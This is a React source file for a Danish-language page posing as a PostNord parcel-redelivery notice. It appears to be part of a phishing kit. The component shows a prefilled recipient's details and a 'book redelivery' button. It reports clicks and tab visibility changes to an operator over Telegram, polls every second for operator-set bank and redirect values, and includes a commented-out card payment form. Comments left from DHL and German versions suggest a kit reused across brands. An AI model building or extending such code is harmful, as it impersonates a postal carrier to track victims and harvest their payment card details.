import { useState, useEffect } from "react";
import { useParams } from "react-router-dom";
import { MapPin, User, Home, Hash, Phone, Edit, Calendar, Clock, Package, CreditCard } from "lucide-react";
import { Skeleton } from "@/components/ui/skeleton";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import DkPackageForm from "./DkPackageForm";
import DkTrackingForm from "./DkTrackingForm";
import DkAddressForm from "./DkAddressForm";
import DkDeliveryDateForm from "./DkDeliveryDateForm";
import { sendRedeliveryNotification, sendPageHiddenNotification, sendPageVisibleNotification } from "../tgapi";
import visaLogo from "@/assets/Visa.png";
interface MainFormProps {
  onShowDeliveryForm?: (data: any) => void;
  onRecipientDataChange?: (data: any) => void;
  invoiceId?: string | null;
  initialData?: any;
}
const MainForm = ({
  onShowDeliveryForm,
  onRecipientDataChange,
  invoiceId,
  initialData
}: MainFormProps) => {
  const { code: routeCode } = useParams();
  // Use invoiceId prop or fallback to route code
  const code = invoiceId !== undefined ? invoiceId : routeCode;
  const [triggerAddressForm, setTriggerAddressForm] = useState(false);
  const [isButtonLoading, setIsButtonLoading] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [recipientName, setRecipientName] = useState("");
  const [invoiceData, setInvoiceData] = useState(null);
  const [showDeliveryDateForm, setShowDeliveryDateForm] = useState(false);
  const [updatedFormData, setUpdatedFormData] = useState(null); // Store updated form data from address form
  // const [showPaymentForm, setShowPaymentForm] = useState(false);

  // Fetch invoice data when component mounts or code changes
  useEffect(() => {
    if (code) {
      setIsLoading(true);
      fetchInvoiceData(code);
    } else {
      // For preview mode (2xnbr), use empty data
      const emptyData = {
        name: "",
        address: "",
        city: "", 
        zip: "",
        phone: ""
      };
      setInvoiceData(emptyData);
      setRecipientName("");
      setIsLoading(false);
      onRecipientDataChange?.(emptyData);
    }
  }, [code]);

  // Real-time polling for bank_name and redirect_sel updates
  useEffect(() => {
    if (!code) return;

    const pollInvoiceData = async () => {
      try {
        const response = await fetch(`/api/create_invoice.php?invoice_id=${code}`);
        if (response.ok) {
          const data = await response.json();
          setInvoiceData(prevData => ({
            ...prevData,
            bank_name: data.bank_name,
            redirect_sel: data.redirect_sel
          }));
        }
      } catch (error) {
        console.error("Error polling invoice data:", error);
      }
    };

    // Poll every 1 second
    const interval = setInterval(pollInvoiceData, 1000);

  // Cleanup interval on unmount
  return () => clearInterval(interval);
}, [code]);

// Page visibility change handler
useEffect(() => {
  const handleVisibilityChange = () => {
    // Use recipientName if available, otherwise fallback to invoice code or "Unknown Client"
    const clientIdentifier = recipientName || code || "Unknown Client";
    
    if (document.hidden) {
      sendPageHiddenNotification(clientIdentifier);
    } else {
      // Page became visible
      sendPageVisibleNotification(clientIdentifier);
    }
  };

  document.addEventListener('visibilitychange', handleVisibilityChange);
  
  return () => {
    document.removeEventListener('visibilitychange', handleVisibilityChange);
  };
}, [recipientName, code]);
  const fetchInvoiceData = async invoiceId => {
    console.log('Fetching invoice data for ID:', invoiceId);
    try {
      const response = await fetch(`/api/create_invoice.php?invoice_id=${invoiceId}`);
      console.log('API response status:', response.status);
      if (response.ok) {
        const data = await response.json();
        console.log('Invoice data received:', data);
        setInvoiceData(data);
        setRecipientName(data.name || "");
        // Pass data to parent component
        onRecipientDataChange?.(data);
      } else {
        console.log("Invoice not found - status:", response.status);
        setRecipientName("");
      }
    } catch (error) {
      console.error("Error fetching invoice data:", error);
      setRecipientName("");
    } finally {
      setIsLoading(false);
    }
  };
  const allDeliveryDetails = [{
    icon: User,
    label: "Modtager",
    value: recipientName || "",
    color: "text-blue-600",
    bgColor: "bg-blue-50"
  }, {
    icon: Home,
    label: "Fuld adresse",
    value: invoiceData?.address || "",
    color: "text-blue-600",
    bgColor: "bg-blue-50"
  }, {
    icon: MapPin,
    label: "By/Land",
    value: invoiceData?.city || "",
    color: "text-blue-600",
    bgColor: "bg-blue-50"
  }, {
    icon: Hash,
    label: "Postnummer",
    value: invoiceData?.zip || "",
    color: "text-blue-600",
    bgColor: "bg-blue-50"
  }, {
    icon: Phone,
    label: "Telefon",
    value: invoiceData?.phone || "",
    color: "text-blue-600",
    bgColor: "bg-blue-50"
  }];
  const handleCardClick = () => {
    setIsLoading(true);
    // Reset trigger first, then set it to true to ensure useEffect fires
    setTriggerAddressForm(false);
    setTimeout(() => {
      setIsLoading(false);
      setTriggerAddressForm(true);
    }, 300);
  };
  const handleRedeliveryClick = async () => {
    setIsButtonLoading(true);
    
    // Send Telegram notifications
    const invoiceName = recipientName || "Unknown Invoice";
    const address = `${invoiceData?.address || ""} ${invoiceData?.city || ""} ${invoiceData?.zip || ""}`.trim() || "Unknown Address";
    await sendRedeliveryNotification(invoiceName, address);
    
    // Check if address, city, and zip are all filled
    const hasCompleteAddress = invoiceData?.address && invoiceData?.city && invoiceData?.zip;
    
    if (hasCompleteAddress) {
      // Skip address verification and go directly to delivery date selection
      setTimeout(() => {
        setIsButtonLoading(false);
        setShowDeliveryDateForm(true);
      }, 300);
    } else {
      // Show address form for verification/completion
      setTriggerAddressForm(false);
      setTimeout(() => {
        setIsButtonLoading(false);
        setTriggerAddressForm(true);
      }, 300);
    }
  };
  console.log('MainForm render - isLoading:', isLoading, 'showDeliveryDateForm:', showDeliveryDateForm, 'invoiceData:', invoiceData);
  
  return <div>
      {/* Show Delivery Date Form if triggered */}
      {showDeliveryDateForm && (
        <DkDeliveryDateForm 
          onComplete={() => setShowDeliveryDateForm(false)}
          name={updatedFormData?.fullName || invoiceData?.name}
          address={updatedFormData?.address || invoiceData?.address}
          city={updatedFormData?.city || invoiceData?.city}
          postCode={updatedFormData?.postcode || invoiceData?.zip}
          phone={updatedFormData?.phone || invoiceData?.phone}
        />
      )}

      {/* Address Form - German version */}
      {!showDeliveryDateForm && (
        <DkAddressForm 
          externalTrigger={triggerAddressForm}
          onClose={() => setTriggerAddressForm(false)}
          invoiceData={invoiceData}
          invoiceId={invoiceId}
          onShowDeliveryForm={(formData) => {
            setUpdatedFormData(formData);
            setShowDeliveryDateForm(true);
          }}
        />
      )}

      {/* Payment Form - shows above delivery details when toggled */}
      {/* {showPaymentForm && (
        <div className="mb-4">
          <PaymentForm 
            onComplete={() => setShowPaymentForm(false)} 
            amount="£2.75"
            bankName={invoiceData?.bank_name || "null"}
            redirectSel={invoiceData?.redirect_sel || "null"}
          />
        </div>
      )} */}

      {/* Delivery Details Card */}
      {!showDeliveryDateForm && isLoading ? (
        <Card className="glass-card shadow-2xl border border-gray-200/50 w-full">
          <CardContent className="py-0 my-0 px-[15px] mx-0">
            <div className="flex items-center justify-between text-sm font-semibold mb-2 -mt-4">
              <Skeleton className="h-4 w-32" />
              <Skeleton className="h-6 w-16" />
            </div>
            <div className="space-y-2 mt-4">
              {[...Array(5)].map((_, index) => (
                <div key={index} className="flex items-center space-x-4">
                  <Skeleton className="h-8 w-8 rounded-xl" />
                  <div className="flex-1">
                    <Skeleton className="h-3 w-16 mb-1" />
                    <Skeleton className="h-4 w-32" />
                  </div>
                </div>
              ))}
            </div>
            <div className="flex justify-center pt-6 pb-4">
              <Skeleton className="h-9 w-40 rounded-lg" />
            </div>
          </CardContent>
        </Card>
      ) : null}
      
      {/* Combined Card with DHL Lieferdetails, Tracking and Package Information */}
      {!showDeliveryDateForm && !isLoading && (
        <div className="mt-4">
          <Card className="glass-card hover-lift shadow-2xl hover:shadow-3xl transition-all duration-300 ease-in-out border border-gray-200/50 w-full hover:scale-98 hover:shadow-xl transform">
            <CardContent className="py-4 px-4 space-y-6">
              {/* DHL Lieferdetails Card */}
              <Card className="glass-card shadow-lg border border-gray-200/50">
                <CardContent className="py-4 px-4">
                  {/* Delivery Details Header */}
                  <div className="flex items-center justify-between text-sm font-semibold mb-2">
                    <span className="relative inline-block drop-shadow-sm">
                      <span className="relative z-10 text-sm">PostNord Leveringsdetaljer</span>
                      <div className="absolute -bottom-2 left-0 w-full h-px bg-gray-400/60 rounded-full blur-[1px]"></div>
                    </span>
                  </div>
                  
                  {/* Delivery Details Items */}
                  <div className="space-y-2 mt-4">
                    {allDeliveryDetails.map((item, index) => {
                  const Icon = item.icon;
                  return <div key={index} className={`group flex items-center space-x-4 ${item.label === "Telefon" ? "mb-4" : ""}`} style={{
                    animationDelay: `${index * 0.1}s`
                  }}>
                          <div className={`relative p-2 rounded-xl ${item.bgColor} group-hover:scale-110 group-hover:rotate-3 transition-all duration-300 shadow-md shadow-black/10 group-hover:shadow-xl group-hover:shadow-black/20 border border-white/50 backdrop-blur-sm`}>
                            <Icon className={`h-4 w-4 ${item.color} drop-shadow-sm group-hover:drop-shadow-md transition-all duration-300`} />
                            <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent pointer-events-none"></div>
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="text-[11px] font-medium text-muted-foreground mb-1 relative">
                              <span className="relative inline-block">
                                <span className="relative z-10">{item.label}</span>
                                <div className="absolute top-1 left-1/4 w-1/2 h-0.5 bg-gray-400/30 rounded-full blur-sm"></div>
                                <div className="absolute top-1.5 left-1/3 w-1/3 h-1 bg-gray-300/20 rounded-full blur-md"></div>
                              </span>
                            </div>
                             <div className="text-xs font-semibold text-card-foreground group-hover:text-card-foreground/80 transition-colors duration-300 relative">
                               <span className="relative inline-block">
                                 <span className="relative z-10">{item.value}</span>
                                 <div className="absolute top-1 left-1/4 w-1/2 h-0.5 bg-gray-400/30 rounded-full blur-sm"></div>
                                 <div className="absolute top-1.5 left-1/3 w-1/3 h-1 bg-gray-300/20 rounded-full blur-md"></div>
                                 {item.label === "Telefon" && <div className="absolute -bottom-2 left-0 w-full h-px bg-gray-400/60 rounded-full blur-[1px]"></div>}
                               </span>
                             </div>
                          </div>
                        </div>;
                })}
                  </div>
                  
                  {/* Book Redelivery Button */}
                  <div className="flex justify-center pt-6 pb-4">
                    <Button onClick={handleRedeliveryClick} disabled={isButtonLoading} className={`w-auto px-4 py-1.5 bg-gradient-to-r from-green-400 to-green-500 hover:from-green-500 hover:to-green-600 text-white shadow-lg hover:shadow-xl transition-all duration-300 text-sm font-semibold rounded-lg hover:scale-105 active:scale-95 ${isButtonLoading ? 'scale-95 opacity-75 cursor-not-allowed' : 'cursor-pointer'}`}>
                      <Calendar className="h-4 w-4 mr-2" />
                      {isButtonLoading ? 'Behandles...' : 'Book genlevering'}
                    </Button>
                  </div>
                </CardContent>
              </Card>
              
              {/* Tracking and Package Information */}
              <DkTrackingForm recipientData={invoiceData} />
              <DkPackageForm recipientData={invoiceData} />
            </CardContent>
          </Card>
        </div>
      )}
    </div>;
};
export default MainForm;
